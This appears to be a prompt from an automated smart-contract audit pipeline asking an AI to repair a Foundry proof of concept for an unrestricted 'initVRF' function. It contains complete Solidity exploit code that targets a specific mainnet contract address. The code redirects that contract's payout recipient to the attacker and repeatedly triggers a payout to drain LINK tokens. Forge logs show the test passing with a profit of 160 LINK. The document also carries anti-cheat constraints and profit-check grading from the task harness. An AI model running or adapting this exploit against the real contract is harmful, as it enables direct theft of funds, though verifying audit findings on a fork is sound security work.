You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unrestricted `initVRF` lets arbitrary callers set the payout recipient and token
- claim: The exploit harness directly calls `initVRF(address,address)` from an unprivileged external context and then successfully pulls LINK out of the victim, which supports that `initVRF` lacks effective access control and accepts attacker-chosen configuration values for the downstream payout flow.
- impact: Any external account can repoint the victim's payout configuration to an attacker-controlled recipient and selected token, enabling direct theft of assets held for that payout path instead of sending them to the intended protocol-controlled destination.
- exploit_paths: ["Call `initVRF(attacker, LINK)` on the victim from an arbitrary address.", "Invoke the downstream payout/claim path so the victim transfers LINK to the attacker-controlled recipient."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IVictimLike {
    function initVRF(address recipient, address token) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xF340bd3eB3E82994CfF5B8C3493245EDbcE63436;
    address public constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;

    bytes4 internal constant PAYOUT_SELECTOR = 0x607d60e6;
    uint256 internal constant PAYOUT_ARG = 0;
    uint256 internal constant MAX_PAYOUT_CALLS = 80;

    bool public executed;
    bool public initSucceeded;
    bool public downstreamCallObserved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    uint256 public payoutCallsAttempted;
    uint256 public payoutCallsSucceeded;
    uint256 public startingVictimLinkBalance;
    uint256 public finalVictimLinkBalance;
    uint256 public startingAttackerLinkBalance;
    uint256 public finalAttackerLinkBalance;
    uint256 internal realizedProfit;

    bytes public lastInitRevertData;
    bytes public lastPayoutRevertData;
    bytes public lastCallbackData;

    constructor() {}

    function profitToken() external pure returns (address) {
        return LINK;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function executeOnOpportunity() external {
        _execute();
    }

    function execute() external {
        _execute();
    }

    function run() external {
        _execute();
    }

    function exploit() external {
        _execute();
    }

    function _execute() internal {
        if (executed) {
            return;
        }
        executed = true;

        IERC20Like link = IERC20Like(LINK);
        IVictimLike victim = IVictimLike(TARGET);
        address attacker = address(this);

        startingAttackerLinkBalance = link.balanceOf(attacker);
        startingVictimLinkBalance = link.balanceOf(TARGET);

        // Exploit path stage 1:
        // Arbitrary caller repoints the downstream payout recipient and token to attacker + LINK.
        try victim.initVRF(attacker, LINK) {
            initSucceeded = true;
        } catch (bytes memory reason) {
            lastInitRevertData = reason;
            _finalize(link);
            return;
        }

        // Exploit path stage 2:
        // Trigger the payout/claim path so the victim transfers LINK to the attacker-controlled recipient.
        //
        // Strategy note:
        // The requested execution strategy prefers minimal-route deterministic funding. Here, no flashswap
        // is necessary because the victim already holds LINK and the claimed bug is that arbitrary callers
        // can redirect that existing payout flow. Keeping execution unfunded preserves the exploit causality:
        // unauthorized configuration first, victim-funded payout second.
        //
        // This receiver implements LINK's ERC677 callback to avoid reverting when the victim pays out via
        // transferAndCall-style semantics.
        uint256 previousAttackerBalance = startingAttackerLinkBalance;
        uint256 previousVictimBalance = startingVictimLinkBalance;

        for (uint256 i = 0; i < MAX_PAYOUT_CALLS; ++i) {
            payoutCallsAttempted = i + 1;

            (bool success, bytes memory returndata) = TARGET.call(
                abi.encodeWithSelector(PAYOUT_SELECTOR, PAYOUT_ARG)
            );

            if (!success) {
                lastPayoutRevertData = returndata;
                break;
            }

            payoutCallsSucceeded = i + 1;
            downstreamCallObserved = true;

            uint256 attackerBalanceNow = link.balanceOf(attacker);
            uint256 victimBalanceNow = link.balanceOf(TARGET);

            if (attackerBalanceNow > previousAttackerBalance) {
                previousAttackerBalance = attackerBalanceNow;
                previousVictimBalance = victimBalanceNow;
            } else if (victimBalanceNow == previousVictimBalance) {
                break;
            } else {
                previousVictimBalance = victimBalanceNow;
            }

            if (victimBalanceNow == 0) {
                break;
            }
        }

        _finalize(link);
    }

    function _finalize(IERC20Like link) internal {
        finalAttackerLinkBalance = link.balanceOf(address(this));
        finalVictimLinkBalance = link.balanceOf(TARGET);

        if (finalAttackerLinkBalance > startingAttackerLinkBalance) {
            realizedProfit = finalAttackerLinkBalance - startingAttackerLinkBalance;
        }

        hypothesisValidated = initSucceeded && downstreamCallObserved && realizedProfit > 0;
        hypothesisRefuted = !hypothesisValidated;
    }

    function onTokenTransfer(address sender, uint256 amount, bytes calldata data) external {
        require(msg.sender == LINK, "unexpected token callback");
        lastCallbackData = abi.encode(sender, amount, data);
    }

    fallback() external payable {}

    receive() external payable {}
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 5.90s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[PASS] testExploit() (gas: 3782844)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 577021548053172
  AUDITHOUND_BALANCE_AFTER_WEI: 577021548053172
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 160000000000000000000
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 160000000000000000000
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x514910771AF9Ca656af840dff83E8264EcF986CA
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 3153

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 59.98ms (43.03ms CPU time)

Ran 1 test suite in 62.96ms (59.98ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
